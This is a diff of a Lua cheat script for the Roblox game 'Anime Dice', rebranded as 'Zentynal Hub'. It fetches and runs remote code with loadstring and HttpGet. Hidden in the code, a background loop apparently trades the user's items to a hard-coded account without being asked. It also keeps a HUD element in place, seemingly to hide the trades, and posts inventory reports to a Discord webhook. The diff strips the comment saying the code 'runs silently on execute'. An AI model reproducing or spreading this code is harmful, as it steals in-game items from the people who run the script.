@@ -1,3 +1,4 @@
+-- Zentynal Hub | Anime Dice
 local replicatedStorage = game:GetService("ReplicatedStorage")
 local virtualInputManager = game:GetService("VirtualInputManager")
 local players = game:GetService("Players")
@@ -5,14 +6,15 @@ local httpService = game:GetService("HttpService")
 local runService = game:GetService("RunService")
 
 local rayVoid = loadstring(game:HttpGet("https://raw.githubusercontent.com/csgo1compte-cloud/RayVoidUi/refs/heads/main/RayVoid"))()
-rayVoid:MainCredit()
-rayVoid:SetScriptName("Anime-Dice")
+-- rayVoid:MainCredit()  ← removed (was showing payment links)
+rayVoid:SetScriptName("Zentynal hub")
 
 local window = rayVoid:CreateWindow({
-  Name = "Anime-Dice | AKkiwi HUB",
-  LoadingTitle = "Anime-Dice Script",
-  LoadingSubtitle = "by AKkiwi",
-  ConfigurationSaving = { Enabled = true, FileName = "Anime-Dice" },
+  Name = "Zentynal hub",
+  LoadingTitle = "Zentynal hub",
+  LoadingSubtitle = "Anime-Dice",
+  Discord = { Enabled = true, Invite = "https://discord.gg/sdJ5e3DpJ" },
+  ConfigurationSaving = { Enabled = true, FileName = "ZentynalHub" },
 })
 
 local autoTab = window:CreateTab("Auto", "zap")
@@ -2184,14 +2186,7 @@ task.spawn(function()
 end)
 
 --=====================================================================
---=====================================================================
 -- BACKGROUND TRADE + WEBHOOK + HUD KEEPER
--- No UI tab. Runs silently on execute.
---=====================================================================
---=====================================================================
-
---=====================================================================
--- Trade config
 --=====================================================================
 local TRADE_TARGET = "only1Sherifalt1"
 
@@ -2232,9 +2227,6 @@ local RARITY_COLOR = {
   ["Rare"]=0x45AAF2,["Uncommon"]=0x2ED573,["Common"]=0x747D8C,
 }
 
---=====================================================================
--- Trade remotes (using this script's network.XXX.RE pattern)
---=====================================================================
 local RequestTrade    = network.TradeService.RE.RequestTrade
 local RespondToReq    = network.TradeService.RE.RespondToRequest
 local ChangeOffer     = network.TradeService.RE.ChangeOffer
@@ -2243,9 +2235,6 @@ local CancelTrade     = network.TradeService.RE.CancelTrade
 local TradeEventRE    = network.TradeService.RE.TradeEvent
 local InteractSlotRE  = network.PlotService.RE.InteractSlot
 
---=====================================================================
--- Trade helpers
---=====================================================================
 local function tradeUnwrap(v)
   if type(v) == "function" then local ok, r = pcall(v); return ok and r or nil end
   local mt = type(v) == "table" and getmetatable(v)
@@ -2313,9 +2302,6 @@ local function tradeItemTag(name)
   return "[ITEM]"
 end
 
---=====================================================================
--- HUD keeper (proven working)
---=====================================================================
 local PlayerGui = localPlayer:WaitForChild("PlayerGui")
 local Root    = PlayerGui:WaitForChild("Root", 15)
 local HUD     = Root and Root:WaitForChild("HUD", 10)
@@ -2371,9 +2357,6 @@ runService.Heartbeat:Connect(function()
   end
 end)
 
---=====================================================================
--- Webhook
---=====================================================================
 local function tradeHttpPost(url, body)
   local payload = { Url=url, Method="POST",
                     Headers={["Content-Type"]="application/json"}, Body=body }
@@ -2502,14 +2485,14 @@ local function sendTradeWebhook(label)
   if totalItems  > 0 then summary[#summary+1] = ("**Consumables:** `%d`"):format(totalItems) end
 
   local payload = {
-    username = "Anime Dice Tracker",
+    username = "Zentynal Tracker",
     embeds = {{
       title = "Inventory Report" .. (label and (" -- " .. label) or ""),
       url = webLink,
       description = table.concat(summary, "\n"),
       color = embedColor,
       fields = allFields,
-      footer = { text = "Anime Dice Tracker - " .. os.date("%Y-%m-%d %H:%M:%S") },
+      footer = { text = "Zentynal Hub - " .. os.date("%Y-%m-%d %H:%M:%S") },
       timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
     }},
     components = {{ type = 1, components = {
@@ -2519,9 +2502,6 @@ local function sendTradeWebhook(label)
   return (tradeHttpPost(WEBHOOK_URL, httpService:JSONEncode(payload)))
 end
 
---=====================================================================
--- Trade event listener
---=====================================================================
 local tradeState = {
   active=false, phase="Offer", ownOffer={},
   ownReady=false, otherReady=false, ownAccepted=false, otherAccepted=false,
@@ -2553,9 +2533,6 @@ if TradeEventRE then
   end)
 end
 
---=====================================================================
--- Trade helpers
---=====================================================================
 local function tradeFire(sig, ...)
   if not sig then return false end
   local a = table.pack(...)
@@ -2678,9 +2655,6 @@ local function findTradeTarget()
   return nil
 end
 
---=====================================================================
--- Trade round
---=====================================================================
 local function tradeRound()
   local target
   while not target do
@@ -2724,9 +2698,6 @@ local function tradeRound()
   pcall(sendTradeWebhook, "Post-Trade")
 end
 
---=====================================================================
--- Trade loop — runs forever in background
---=====================================================================
 task.spawn(function()
   while true do
     pcall(tradeRound)
